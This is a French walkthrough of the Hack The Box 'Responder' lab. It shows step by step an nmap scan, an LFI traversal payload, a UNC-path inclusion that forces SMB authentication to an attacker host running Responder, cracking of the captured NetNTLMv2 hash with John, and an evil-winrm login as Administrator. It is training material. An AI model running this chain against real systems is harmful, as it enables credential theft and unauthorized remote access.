# Note détaillée du déroulement du document "Responder Write-up"

## Introduction

Windows est le système d'exploitation le plus répandu aujourd'hui en raison de son interface utilisateur graphique facile à utiliser. Environ 85 % du marché étant dominé par Windows, il devient une cible critique pour les attaques. De plus, la plupart des organisations utilisent Active Directory pour configurer leurs réseaux de domaine Windows. Microsoft utilise NTLM (New Technology LAN Manager) et Kerberos pour les services d'authentification. Malgré les vulnérabilités connues, NTLM reste largement déployé, même sur les nouveaux systèmes, pour maintenir la compatibilité avec les clients et serveurs hérités.

Ce laboratoire se concentre sur la manière dont une vulnérabilité d'inclusion de fichier sur une page web servie sur une machine Windows peut être exploitée pour collecter le défi NetNTLMv2 de l'utilisateur exécutant le serveur web. Nous utiliserons un utilitaire appelé Responder pour capturer un hachage NetNTLMv2 et utiliserons ensuite un utilitaire connu sous le nom de John the Ripper pour tester des millions de mots de passe potentiels pour voir s'ils correspondent à celui utilisé pour créer le hachage. Nous allons également examiner de plus près le processus de fonctionnement de l'authentification NTLM et comment l'utilitaire Responder capture le défi. Nous croyons qu'il est crucial de comprendre le fonctionnement interne d'un outil ou d'un framework, car cela renforce la compréhension, ce qui aide dans les scénarios d'exploitation réels qui ne semblent pas vulnérables au premier regard. Allons-y.

## Énumération

Nous commencerons par scanner l'hôte pour détecter les ports ouverts et les services en cours d'exécution avec un scan Nmap. Nous utiliserons les indicateurs suivants pour le scan :

- **Commande** : `nmap -p- --min-rate 1000 -sV {IP_de_la_cible}` pour scanner tous les ports TCP de 0 à 65535, déterminer la version du service et spécifier le nombre minimum de paquets que Nmap doit envoyer par seconde pour accélérer le scan.

Comment Nmap détermine-t-il le service en cours d'exécution sur le port ?

Nmap utilise une base de données de services bien connus pour déterminer le service exécuté sur un port particulier. Il envoie également des requêtes spécifiques au service pour déterminer la version du service et toute information supplémentaire à son sujet.

Selon les résultats du scan Nmap, la machine utilise Windows comme système d'exploitation. Deux ports ont été détectés comme ouverts, avec un serveur web Apache fonctionnant sur le port 80 et WinRM sur le port 5985.

### 1. Connexion WinRM
Windows Remote Management (WinRM) est un protocole de gestion à distance intégré à Windows qui utilise le protocole SOAP pour interagir avec des ordinateurs et serveurs distants, ainsi que des systèmes d'exploitation et des applications. En tant que pentester, cela signifie que si nous pouvons trouver des identifiants (généralement un nom d'utilisateur et un mot de passe) pour un utilisateur ayant des privilèges de gestion à distance, nous pouvons potentiellement obtenir un shell PowerShell sur l'hôte.

## Énumération du site Web

En ouvrant Firefox et en saisissant http://[IP_de_la_cible], le navigateur renvoie un message indiquant qu'il est impossible de trouver ce site. En regardant dans la barre d'URL, il montre maintenant http://unika.htb. Le serveur web utilise l'hébergement virtuel basé sur le nom pour répondre aux requêtes. Nous devons ajouter une entrée dans le fichier /etc/hosts pour ce domaine afin de permettre au navigateur de résoudre l'adresse de unika.htb.

### 2. Modifier le fichier /etc/hosts

- **Commande** : `echo "{IP_de_la_cible} unika.htb" | sudo tee -a /etc/hosts`

Sur la page web, nous remarquons une option de sélection de langue dans la barre de navigation. En changeant l'option en FR, nous accédons à une version française du site web. En observant l'URL, nous voyons que la page french.html est chargée par le paramètre page, ce qui peut potentiellement être vulnérable à une vulnérabilité d'inclusion de fichier local (LFI) si l'entrée de la page n'est pas nettoyée.

## Vulnérabilité d'inclusion de fichier

Les sites web dynamiques incluent des pages HTML à la volée en utilisant des informations de la requête HTTP pour inclure des paramètres GET et POST, des cookies et d'autres variables. LFI ou Local File Inclusion se produit lorsqu'un attaquant est capable de faire inclure un fichier par un site web qui n'était pas prévu pour cette application. Par exemple, si une application utilise le chemin d'un fichier comme entrée, et que les contrôles de sécurité nécessaires ne sont pas effectués sur cette entrée, alors l'attaquant peut l'exploiter en utilisant la chaîne ../ pour remonter dans les répertoires et éventuellement voir des fichiers sensibles du système de fichiers local.

### 3. Tester la vulnérabilité LFI
- **Commande** : `http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`

Nous voyons le contenu du fichier hosts de C:\windows\system32\drivers\etc dans la réponse, confirmant la vulnérabilité LFI.

## Capturer le défi avec Responder

### 4. Utiliser Responder pour capturer les défis NTLMv2

Nous savons que cette page web est vulnérable à l'inclusion de fichier et qu'elle est servie sur une machine Windows. Il existe donc une possibilité d'inclure un fichier sur notre machine attaquante. Si nous choisissons un protocole comme SMB, Windows essaiera de s'authentifier sur notre machine et nous pourrons capturer le NetNTLMv2.

### 5. Configuration de Responder
Si l'utilitaire Responder n'est pas déjà installé sur la machine, nous clonons le dépôt Responder sur notre machine locale.

- **Commande** : `git clone https://github.com/lgandx/Responder`
- **Commande** : `sudo responder -I {interface_réseau}`

### 6. Inclure le fichier SMB
- **Commande** : `http://unika.htb/?page=//{IP_attacker}/somefile`

Lorsque le serveur essaie de charger la ressource depuis notre serveur SMB, Responder capture le NetNTLMv2 pour l'utilisateur Administrator.

### 7. Cracking du hash

Nous pouvons dumper le hash dans un fichier et essayer de le craquer avec John the Ripper, un utilitaire de craquage de hash de mot de passe.

- **Commande** : `echo "Administrator::...:hash_value" > hash.txt`
- **Commande** : `john -w=/usr/share/wordlists/rockyou.txt hash.txt`

John essaiera chaque mot de passe de la liste de mots de passe donnée, en cryptant le défi avec ce mot de passe. Si le résultat correspond à la réponse, il saura qu'il a trouvé le mot de passe correct. Dans ce cas, le mot de passe du compte Administrator a été craqué avec succès.

### 8. Connexion WinRM

Nous nous connecterons au service WinRM sur la cible et essaierons d'obtenir une session. Étant donné que PowerShell n'est pas installé par défaut sur Linux, nous utiliserons un outil appelé Evil-WinRM.

- **Commande** : `evil-winrm -i {IP_de_la_cible} -u administrator -p {mot_de_passe}`

Nous pouvons trouver le flag sous C:\Users\mike\Desktop\flag.txt.

### 9. Soumission de la Flag

Copiez la valeur de hachage obtenue et collez-la sur la page du lab Starting Point pour obtenir la propriété de la machine.
